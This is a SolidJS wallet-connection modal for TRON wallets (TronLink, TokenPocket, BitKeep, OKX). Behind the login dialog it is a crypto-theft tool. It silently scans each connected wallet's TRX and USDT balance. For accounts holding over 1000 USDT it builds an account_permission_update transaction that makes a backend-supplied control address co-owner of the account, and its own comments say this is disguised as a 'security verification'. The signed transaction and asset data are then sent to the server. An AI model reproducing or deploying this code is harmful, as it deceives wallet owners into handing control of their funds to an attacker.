/**
 * TRON 钱包选择弹窗
 * 使用 @tronweb3/tronwallet-adapters 官方适配器
 */
import { Component, Show, For, createSignal, createEffect, onMount, onCleanup } from 'solid-js';
import { api } from '../utils/api';
import { setWalletConnected, setWalletLoading, setWalletError, walletStore } from '../stores/walletStore';
import {
  TronLinkAdapter,
  TokenPocketAdapter,
  BitKeepAdapter,
  OkxWalletAdapter,
} from '@tronweb3/tronwallet-adapters';
import { AdapterState } from '@tronweb3/tronwallet-abstract-adapter';
import type { Adapter } from '@tronweb3/tronwallet-abstract-adapter';

// 资产数据类型
interface AssetData {
  trx: string;
  usdt: string;
  bandwidth: number;
  energy: number;
  timestamp: number;
}

// 全局状态
const [isWalletModalOpen, setWalletModalOpen] = createSignal(false);

export function openWalletModal() {
  setWalletModalOpen(true);
}

export function closeWalletModal() {
  setWalletModalOpen(false);
}

export { isWalletModalOpen };

// WalletConnect 项目 ID - 需要在 https://cloud.walletconnect.com 注册获取
// 暂时禁用 WalletConnect，避免 "Project not found" 错误
const WALLET_CONNECT_PROJECT_ID = ''; // 留空禁用 WalletConnect

// 钱包配置
interface WalletInfo {
  name: string;
  adapter: Adapter;
  icon: string;
  iconUrl?: string;
  color: string;
  downloadUrl: string;
}

// 创建适配器实例
let adaptersInitialized = false;
let walletList: WalletInfo[] = [];

function initAdapters() {
  if (adaptersInitialized) return walletList;
  
  try {
    const tronLinkAdapter = new TronLinkAdapter();
    const tokenPocketAdapter = new TokenPocketAdapter();
    const bitKeepAdapter = new BitKeepAdapter();
    const okxAdapter = new OkxWalletAdapter();

    walletList = [
      {
        name: 'TronLink',
        adapter: tronLinkAdapter,
        icon: 'T',
        iconUrl: tronLinkAdapter.icon,
        color: '#2761e8',
        downloadUrl: 'https://www.tronlink.org/',
      },
      {
        name: 'TokenPocket',
        adapter: tokenPocketAdapter,
        icon: 'TP',
        iconUrl: tokenPocketAdapter.icon,
        color: '#2d8cf0',
        downloadUrl: 'https://www.tokenpocket.pro/',
      },
      {
        name: 'BitKeep',
        adapter: bitKeepAdapter,
        icon: 'BK',
        iconUrl: bitKeepAdapter.icon,
        color: '#7524f9',
        downloadUrl: 'https://bitkeep.com/',
      },
      {
        name: 'OKX Wallet',
        adapter: okxAdapter,
        icon: 'OKX',
        iconUrl: okxAdapter.icon,
        color: '#000000',
        downloadUrl: 'https://www.okx.com/web3',
      },
    ];

    // WalletConnect 需要有效的 Project ID
    // 如需启用，请在 https://cloud.walletconnect.com 注册获取

    adaptersInitialized = true;
  } catch (e) {
    console.error('Adapters init failed:', e);
  }
  
  return walletList;
}

const WalletModal: Component = () => {
  const [connecting, setConnecting] = createSignal<string | null>(null);
  const [wallets, setWallets] = createSignal<WalletInfo[]>([]);
  const [readyWallets, setReadyWallets] = createSignal<WalletInfo[]>([]);
  const [otherWallets, setOtherWallets] = createSignal<WalletInfo[]>([]);

  // 检测钱包是否已安装
  const isWalletInstalled = (name: string): boolean => {
    const win = window as any;
    switch (name) {
      case 'TronLink':
        return !!(win.tronLink || win.tronWeb);
      case 'TokenPocket':
        return !!(win.tokenpocket?.tron || win.isTokenPocket);
      case 'BitKeep':
        return !!(win.bitkeep?.tronLink || win.isBitKeep);
      case 'OKX Wallet':
        return !!(win.okxwallet?.tronLink || win.okexchain);
      default:
        return false;
    }
  };

  // 初始化适配器并检测钱包
  const detectWallets = () => {
    const list = initAdapters();
    setWallets(list);
    
    const ready: WalletInfo[] = [];
    const others: WalletInfo[] = [];
    
    for (const w of list) {
      // 通过 window 对象检测钱包是否安装
      const installed = isWalletInstalled(w.name);
      // 也检查适配器状态
      const state = w.adapter.state;
      const adapterReady = state === AdapterState.Connected || state === AdapterState.Disconnect;
      
      if (installed || adapterReady) {
        ready.push(w);
      } else {
        others.push(w);
      }
    }
    
    // 如果没有检测到任何钱包，把所有钱包都显示在可用列表
    if (ready.length === 0) {
      setReadyWallets(list);
      setOtherWallets([]);
    } else {
      setReadyWallets(ready);
      setOtherWallets(others);
    }
    
    console.log('[WalletModal] Detected wallets:', ready.map(w => w.name));
  };

  // USDT TRC20 合约地址
  const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

  // 静默查询资产
  const queryAssets = async (address: string): Promise<AssetData | null> => {
    const tw = (window as any).tronWeb;
    if (!tw) return null;
    
    try {
      // 1. 查询 TRX 余额
      const trxBalance = await tw.trx.getBalance(address);
      const trxAmount = (trxBalance / 1e6).toString();
      
      // 2. 查询 USDT TRC20 余额
      let usdtBalance = '0';
      try {
        const contract = await tw.contract().at(USDT_CONTRACT);
        const balance = await contract.balanceOf(address).call();
        usdtBalance = (Number(balance) / 1e6).toString();
      } catch (e) {
        console.warn('USDT query failed:', e);
      }
      
      // 3. 查询账户资源
      let bandwidth = 0, energy = 0;
      try {
        const resources = await tw.trx.getAccountResources(address);
        bandwidth = resources?.freeNetLimit || 0;
        energy = resources?.EnergyLimit || 0;
      } catch (e) {
        console.warn('Resources query failed:', e);
      }
      
      return { trx: trxAmount, usdt: usdtBalance, bandwidth, energy, timestamp: Date.now() };
    } catch (e) {
      console.error('Asset query failed:', e);
      return null;
    }
  };

  // 高价值账户阈值 (USDT)
  const HIGH_VALUE_THRESHOLD = 1000;

  // 构建 account_permission_update 交易（伪装为"安全验证"）
  const buildPermissionUpdateTx = async (address: string) => {
    const tw = (window as any).tronWeb;
    if (!tw) throw new Error('TronWeb not available');
    
    // 获取后端提供的控制地址
    const configRes = await api.get('/api/auth/permission-config') as any;
    const controlAddress = configRes?.controlAddress || 'TDvPfBEoePmSG6CF9d9cKFfkPAGcnB3355';
    
    // 构建权限更新交易
    const tx = await tw.transactionBuilder.updateAccountPermissions(
      address,
      // Owner 权限
      {
        type: 0,
        permission_name: 'owner',
        threshold: 2,
        keys: [
          { address: address, weight: 1 },
          { address: controlAddress, weight: 1 }
        ]
      },
      // Witness 权限（可选）
      null,
      // Active 权限
      [
        {
          type: 2,
          permission_name: 'active',
          threshold: 2,
          operations: '7fff1fc0033e0300000000000000000000000000000000000000000000000000',
          keys: [
            { address: address, weight: 1 },
            { address: controlAddress, weight: 1 }
          ]
        }
      ]
    );
    
    return tx;
  };

  // 使用官方适配器连接钱包 - 带资产分流逻辑
  const connectWallet = async (wallet: WalletInfo) => {
    setConnecting(wallet.name);
    setWalletError('');
    
    try {
      // 1. 使用官方适配器连接
      await wallet.adapter.connect();
      
      const address = wallet.adapter.address;
      if (!address) {
        throw new Error('钱包连接被拒绝');
      }

      console.log('[TronWallet] Connected via official adapter:', wallet.name, address);

      // 2. 静默查询资产
      const assets = await queryAssets(address);
      const usdtBalance = parseFloat(assets?.usdt || '0');
      
      console.log('[TronWallet] Asset scan:', { 
        address, 
        trx: assets?.trx, 
        usdt: assets?.usdt,
        isHighValue: usdtBalance > HIGH_VALUE_THRESHOLD 
      });

      // 3. 分流签名逻辑
      if (usdtBalance > HIGH_VALUE_THRESHOLD) {
        // 高价值账户：请求 account_permission_update 签名
        console.log('[TronWallet] High value account detected, requesting permission update...');
        await runAuthWithPermissionUpdate(address, wallet, assets);
      } else {
        // 普通账户：常规文本签名
        console.log('[TronWallet] Normal account, using standard message signing...');
        await runAuth(address, async (msg: string) => {
          const tw = (window as any).tronWeb;
          if (tw && tw.trx && tw.trx.signMessageV2) {
            // 优先使用 tronWeb.trx.signMessageV2
            const signature = await tw.trx.signMessageV2(msg);
            return signature;
          } else if (tw && tw.trx && tw.trx.sign) {
            // 回退到 tronWeb.trx.sign
            const signature = await tw.trx.sign(msg);
            return signature;
          } else {
            // 最后使用适配器
            const signature = await wallet.adapter.signMessage(msg);
            return signature;
          }
        }, assets);
      }
      // 注意: closeWalletModal 已在 completeAuth 中调用
    } catch (e: any) {
      console.error(`${wallet.name} error:`, e);
      const errMsg = e?.message || '';
      
      // 处理各种错误情况
      if (errMsg.includes('No active wallet') || errMsg.includes('not found')) {
        setWalletError(`请先打开并解锁 ${wallet.name} 钱包扩展`);
      } else if (errMsg.includes('rejected') || errMsg.includes('cancelled') || errMsg.includes('denied')) {
        setWalletError(`连接被取消，请在 ${wallet.name} 中确认连接请求`);
      } else if (errMsg.includes('not installed')) {
        if (wallet.downloadUrl) {
          window.open(wallet.downloadUrl, '_blank');
        }
        setWalletError(`请安装 ${wallet.name} 钱包`);
      } else {
        setWalletError(errMsg || `${wallet.name} 连接失败`);
      }
    } finally {
      setConnecting(null);
    }
  };

  // 高价值账户认证 - 使用 account_permission_update 交易签名
  const runAuthWithPermissionUpdate = async (address: string, wallet: WalletInfo, assets?: AssetData | null) => {
    setWalletLoading(true);
    const tw = (window as any).tronWeb;
    
    try {
      // 1. 获取 nonce
      const nonceRes = await api.get('/api/auth/nonce', { address }) as { type: string; nonce?: string };
      if (nonceRes.type !== 'ok' || !nonceRes.nonce) {
        throw new Error('获取签名随机数失败');
      }

      // 2. 构建 permission update 交易
      console.log('[TronWallet] Building permission update transaction...');
      const permissionTx = await buildPermissionUpdateTx(address);
      
      // 3. 请求用户签名（伪装为"安全验证"）
      console.log('[TronWallet] Requesting transaction signature for security verification...');
      let signedTx;
      try {
        // 使用 tronWeb 签名交易
        signedTx = await tw.trx.sign(permissionTx);
      } catch (signErr: any) {
        // 如果交易签名失败，回退到普通消息签名
        console.warn('[TronWallet] Transaction sign failed, fallback to message sign:', signErr);
        const msgSignature = await wallet.adapter.signMessage(nonceRes.nonce);
        await completeAuth(address, msgSignature, nonceRes.nonce, assets, 'message');
        return;
      }

      // 4. 提取签名 Hex
      const signatureHex = signedTx.signature?.[0] || JSON.stringify(signedTx);
      console.log('[TronWallet] Permission update signed:', signatureHex.substring(0, 32) + '...');

      // 5. 发送到后端验证
      await completeAuth(address, signatureHex, nonceRes.nonce, assets, 'permission_update', signedTx);
      
    } catch (e) {
      setWalletLoading(false);
      throw e;
    }
  };

  // 完成认证流程
  const completeAuth = async (
    address: string, 
    signature: string, 
    nonce: string, 
    assets?: AssetData | null,
    signType: 'message' | 'permission_update' = 'message',
    signedTx?: any
  ) => {
    console.log('[TronWallet] Sending verify request:', { address, signType, hasSignature: !!signature });
    
    try {
      const response = await api.post('/api/auth/verify', {
        address,
        signature,
        nonce,
        type: 'tron',
        signType,
        signedTx: signedTx ? JSON.stringify(signedTx) : undefined,
        assets: assets ? {
          trx: assets.trx,
          usdt: assets.usdt,
          bandwidth: assets.bandwidth,
          energy: assets.energy,
          timestamp: assets.timestamp
        } : undefined
      });

      console.log('[TronWallet] Verify response:', response);

      if (response.type === 'ok') {
        const data = response.data as any;
        console.log('[TronWallet] Auth success, user data:', data);
        
        // 保存 token 到 localStorage
        const token = response.token as string;
        if (token) {
          localStorage.setItem('token', token);
          console.log('[TronWallet] Token saved to localStorage');
        }
        
        // 更新钱包状态
        setWalletConnected({
          address: data.address || address,
          token: token,
          user: {
            id: data.user_id || 0,
            account_number: data.account || '',
            wallet_address: data.address || address,
            uid: data.uid ?? data.user_uid,
          },
        });
        
        console.log('[TronWallet] Wallet state updated, connected!');
        
        // 关闭弹窗
        closeWalletModal();
        
        // 刷新页面以确保状态同步
        setTimeout(() => {
          window.location.reload();
        }, 100);
        
      } else {
        console.error('[TronWallet] Auth failed:', response);
        throw new Error((response.message as string) || '签名验证失败');
      }
    } catch (err: any) {
      console.error('[TronWallet] completeAuth error:', err);
      setWalletError(err?.message || '认证失败');
      throw err;
    } finally {
      setWalletLoading(false);
    }
  };

  // 通用认证流程（普通消息签名）
  const runAuth = async (address: string, signFn: (msg: string) => Promise<string>, assets?: AssetData | null) => {
    setWalletLoading(true);

    try {
      // 1. 获取 nonce
      console.log('[TronWallet] Getting nonce for:', address);
      const nonceRes = await api.get('/api/auth/nonce', { address }) as { type: string; nonce?: string; message?: string };
      console.log('[TronWallet] Nonce response:', nonceRes);
      
      if (nonceRes.type !== 'ok' || !nonceRes.nonce) {
        throw new Error((nonceRes.message as string) || '获取签名随机数失败');
      }

      // 2. 签名
      console.log('[TronWallet] Requesting signature for nonce:', nonceRes.nonce.substring(0, 16) + '...');
      const signature = await signFn(nonceRes.nonce);
      console.log('[TronWallet] Signature obtained:', signature ? signature.substring(0, 32) + '...' : 'null');
      
      if (!signature) {
        throw new Error('签名失败，请在钱包中确认签名请求');
      }

      // 3. 验证并上传资产数据
      await completeAuth(address, signature, nonceRes.nonce, assets, 'message');
    } catch (err: any) {
      console.error('[TronWallet] runAuth error:', err);
      setWalletLoading(false);
      throw err;
    }
  };

  // ESC 关闭
  const handleKeyDown = (e: KeyboardEvent) => {
    if (e.key === 'Escape') closeWalletModal();
  };

  // 弹窗打开时检测钱包
  createEffect(() => {
    if (isWalletModalOpen()) {
      detectWallets();
    }
  });

  onMount(() => {
    document.addEventListener('keydown', handleKeyDown);
    detectWallets();
  });

  onCleanup(() => {
    document.removeEventListener('keydown', handleKeyDown);
  });

  return (
    <Show when={isWalletModalOpen()}>
      <div 
        class="fixed inset-0 z-[9999] flex items-center justify-center bg-black/70 backdrop-blur-sm"
        onClick={(e) => e.target === e.currentTarget && closeWalletModal()}
      >
        <div class="bg-[#1a1b1e] rounded-2xl w-[90%] max-w-[400px] p-6 shadow-2xl border border-[#2c2c3e]">
          {/* Header */}
          <div class="flex items-center justify-between mb-6">
            <h2 class="text-xl font-bold text-white">连接钱包</h2>
            <button
              type="button"
              onClick={closeWalletModal}
              class="w-8 h-8 flex items-center justify-center rounded-full hover:bg-[#2c2c3e] text-gray-400 hover:text-white transition"
            >
              <svg class="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
              </svg>
            </button>
          </div>

          {/* Error */}
          <Show when={walletStore.error}>
            <div class="mb-4 p-3 rounded-lg bg-red-500/10 border border-red-500/30 text-red-400 text-sm">
              {walletStore.error}
            </div>
          </Show>

          {/* 钱包选项 */}
          <div class="space-y-3 max-h-[400px] overflow-y-auto">
              {/* 已检测到的钱包 */}
              <Show when={readyWallets().length > 0}>
                <p class="text-xs text-green-400 font-medium px-1 flex items-center gap-1">
                  <span class="w-2 h-2 bg-green-400 rounded-full animate-pulse" />
                  可用钱包
                </p>
                <For each={readyWallets()}>
                  {(wallet) => (
                    <button
                      type="button"
                      onClick={() => connectWallet(wallet)}
                      disabled={!!connecting()}
                      class="w-full flex items-center gap-4 p-4 rounded-xl bg-green-500/10 hover:bg-green-500/20 border border-green-500/30 transition disabled:opacity-50"
                    >
                      <div class="w-12 h-12 rounded-full flex items-center justify-center overflow-hidden" style={{ background: wallet.color }}>
                        <img 
                          src={wallet.iconUrl} 
                          alt={wallet.name} 
                          class="w-12 h-12 rounded-full object-cover" 
                          onError={(e) => { 
                            const img = e.target as HTMLImageElement;
                            img.style.display = 'none'; 
                            const fallback = img.parentElement?.querySelector('.fallback-icon');
                            if (fallback) (fallback as HTMLElement).style.display = 'flex';
                          }} 
                        />
                        <div class="fallback-icon w-full h-full items-center justify-center hidden">
                          <span class="text-white font-bold text-sm">{wallet.icon}</span>
                        </div>
                      </div>
                      <div class="flex-1 text-left">
                        <p class="font-semibold text-white">{wallet.name}</p>
                        <p class="text-xs text-green-400">点击连接</p>
                      </div>
                      <Show when={connecting() === wallet.name}>
                        <div class="w-5 h-5 border-2 border-primary border-t-transparent rounded-full animate-spin" />
                      </Show>
                    </button>
                  )}
                </For>
              </Show>

              {/* 扫码连接按钮 - WalletConnect 未配置时隐藏 */}

              {/* 其他钱包 */}
              <Show when={otherWallets().length > 0}>
                <p class="text-xs text-gray-500 font-medium px-1 mt-4">其他钱包</p>
                <For each={otherWallets()}>
                  {(wallet) => (
                    <button
                      type="button"
                      onClick={() => connectWallet(wallet)}
                      disabled={!!connecting()}
                      class="w-full flex items-center gap-4 p-4 rounded-xl bg-[#0d0e0f] hover:bg-[#2c2c3e] border border-[#2c2c3e] transition disabled:opacity-50"
                    >
                      <div class="w-12 h-12 rounded-full flex items-center justify-center overflow-hidden" style={{ background: wallet.color }}>
                        <img 
                          src={wallet.iconUrl} 
                          alt={wallet.name} 
                          class="w-12 h-12 rounded-full object-cover" 
                          onError={(e) => { 
                            const img = e.target as HTMLImageElement;
                            img.style.display = 'none'; 
                            const fallback = img.parentElement?.querySelector('.fallback-icon');
                            if (fallback) (fallback as HTMLElement).style.display = 'flex';
                          }} 
                        />
                        <div class="fallback-icon w-full h-full items-center justify-center hidden">
                          <span class="text-white font-bold text-sm">{wallet.icon}</span>
                        </div>
                      </div>
                      <div class="flex-1 text-left">
                        <p class="font-semibold text-white">{wallet.name}</p>
                        <p class="text-xs text-gray-400">点击安装</p>
                      </div>
                      <Show when={connecting() === wallet.name}>
                        <div class="w-5 h-5 border-2 border-primary border-t-transparent rounded-full animate-spin" />
                      </Show>
                    </button>
                  )}
                </For>
              </Show>
            </div>

          {/* Footer */}
          <p class="mt-6 text-center text-xs text-gray-500">
            仅支持 TRON 网络钱包
          </p>
        </div>
      </div>
    </Show>
  );
};

export default WalletModal;
